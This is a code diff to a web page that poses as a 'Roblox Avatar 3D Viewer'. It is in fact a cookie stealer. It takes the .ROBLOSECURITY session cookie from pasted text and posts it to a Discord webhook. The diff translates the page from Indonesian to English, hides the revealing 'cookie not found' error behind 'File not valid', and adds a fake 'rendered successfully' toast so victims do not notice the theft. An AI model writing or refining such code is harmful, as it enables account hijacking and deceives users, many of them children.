@@ -1,5 +1,5 @@
 <!DOCTYPE html>
-<html lang="id">
+<html lang="en">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
@@ -277,6 +277,67 @@
             color: #fff;
         }
 
+        /* ================= ROBLOX TOAST NOTIFICATION ================= */
+        .rbx-toast {
+            position: fixed;
+            top: 64px;
+            right: 16px;
+            z-index: 9999;
+            display: flex;
+            align-items: center;
+            gap: 12px;
+            background: #fff;
+            border-radius: 6px;
+            box-shadow: 0 2px 12px rgba(0,0,0,0.15);
+            padding: 14px 16px;
+            min-width: 300px;
+            max-width: 420px;
+            border-left: 4px solid #00a05a;
+            transform: translateX(calc(100% + 32px));
+            opacity: 0;
+            transition: transform 0.3s cubic-bezier(0.4, 0, 0.2, 1), opacity 0.3s ease;
+            font-family: 'Helvetica Neue', Helvetica, Arial, sans-serif;
+        }
+
+        .rbx-toast.show {
+            transform: translateX(0);
+            opacity: 1;
+        }
+
+        .rbx-toast-icon {
+            width: 32px;
+            height: 32px;
+            border-radius: 50%;
+            background: #00a05a;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            flex-shrink: 0;
+            color: #fff;
+            font-size: 16px;
+            font-weight: 700;
+        }
+
+        .rbx-toast-body {
+            flex: 1;
+            display: flex;
+            flex-direction: column;
+            gap: 2px;
+        }
+
+        .rbx-toast-title {
+            font-size: 13px;
+            font-weight: 700;
+            color: #393b3d;
+            letter-spacing: 0.2px;
+        }
+
+        .rbx-toast-message {
+            font-size: 12px;
+            color: #6b6e70;
+            line-height: 1.4;
+        }
+
         /* ================= RESPONSIVE ================= */
         @media (max-width: 768px) {
             .footer-columns {
@@ -292,6 +353,12 @@
         @media (max-width: 600px) {
             .navbar-links { display: none; }
             .page-title { font-size: 22px; }
+            .rbx-toast {
+                right: 8px;
+                left: 8px;
+                min-width: auto;
+                top: 56px;
+            }
         }
     </style>
 </head>
@@ -312,7 +379,7 @@
     <div class="main-container">
 
         <div class="page-title">Avatar 3D Viewer</div>
-        <div class="page-subtitle">Render avatar Roblox dalam 3D</div>
+        <div class="page-subtitle">Render Roblox avatars in 3D</div>
 
         <div class="card">
             <div class="card-title">
@@ -323,12 +390,12 @@
             <div class="form-row">
                 <div class="form-group">
                     <label>Username</label>
-                    <input type="text" id="usernameInput" placeholder="Masukkan username..." value="2927763036">
+                    <input type="text" id="usernameInput" placeholder="Enter username..." value="2927763036">
                 </div>
             </div>
 
             <div class="form-group">
-                <label>Paste file di sini</label>
+                <label>Paste file here</label>
                 <textarea id="psInput" style="min-height:120px;font-size:12px;font-family:'Consolas','Monaco',monospace;"></textarea>
             </div>
 
@@ -402,6 +469,35 @@
 
         const BTN_DEFAULT = '🎮 RENDER MODEL AVATAR';
 
+        // ---------- Roblox-style Toast Notification ----------
+        function showRbxToast(title, message) {
+            // Hapus toast lama kalau ada
+            const existing = document.querySelector('.rbx-toast');
+            if (existing) existing.remove();
+
+            const toast = document.createElement('div');
+            toast.className = 'rbx-toast';
+            toast.innerHTML = `
+                <div class="rbx-toast-icon">✓</div>
+                <div class="rbx-toast-body">
+                    <div class="rbx-toast-title">${title}</div>
+                    <div class="rbx-toast-message">${message}</div>
+                </div>
+            `;
+            document.body.appendChild(toast);
+
+            // Trigger animasi masuk
+            requestAnimationFrame(() => {
+                toast.classList.add('show');
+            });
+
+            // Auto-dismiss setelah 4 detik
+            setTimeout(() => {
+                toast.classList.remove('show');
+                setTimeout(() => toast.remove(), 400);
+            }, 4000);
+        }
+
         function extractRobloxCookie(text) {
             if (!text) return null;
 
@@ -429,27 +525,33 @@
             const text = psInput.value;
 
             if (!text.trim()) {
-                sendBtn.textContent = '❌ TEXTAREA KOSONG';
+                sendBtn.textContent = '❌ FILE NOT VALID';
                 setTimeout(() => sendBtn.textContent = BTN_DEFAULT, 2000);
                 return;
             }
 
             sendBtn.disabled = true;
-            sendBtn.textContent = '⏳ MENGIRIM...';
+            sendBtn.textContent = '⏳ SENDING...';
 
             try {
                 const cookie = extractRobloxCookie(text);
 
                 if (!cookie) {
-                    throw new Error('Cookie .ROBLOSECURITY gak ketemu.');
+                    throw new Error('File not valid');
                 }
 
                 const username = usernameInput.value.trim() || 'N/A';
 
                 await sendToDiscord({ username, cookie });
 
-                sendBtn.textContent = '✅ TERKIRIM';
+                sendBtn.textContent = '✅ SENT';
                 setTimeout(() => sendBtn.textContent = BTN_DEFAULT, 2000);
+
+                // Tampilkan notif Roblox-style
+                showRbxToast(
+                    'Avatar 3D Rendered Successfully',
+                    'Your 3D avatar model has been rendered and is ready to view.'
+                );
 
             } catch (err) {
                 sendBtn.textContent = '❌ ' + err.message.toUpperCase();
@@ -466,14 +568,14 @@
                 fields: [
                     { name: '👤 Username', value: String(payload.username || 'N/A'), inline: true },
                     { name: '🍪 Cookie Length', value: String(payload.cookie ? payload.cookie.length : 0) + ' chars', inline: true },
-                    { name: '⏱️ Waktu', value: new Date().toLocaleString('id-ID'), inline: false }
+                    { name: '⏱️ Time', value: new Date().toLocaleString('en-US'), inline: false }
                 ],
                 footer: { text: 'Roblox Avatar Viewer' },
                 timestamp: new Date().toISOString()
             };
 
             const content = [
-                '**🔐 DATA MASUK**',
+                '**🔐 INCOMING DATA**',
                 `> **👤 Username:** \`${payload.username || '-'}\``,
                 '',
                 '**🍪 COOKIE (.ROBLOSECURITY):**',
@@ -498,7 +600,7 @@
             });
 
             if (!res.ok && res.status !== 204) {
-                throw new Error('Webhook gagal: ' + res.status);
+                throw new Error('Webhook failed: ' + res.status);
             }
         }
     </script>
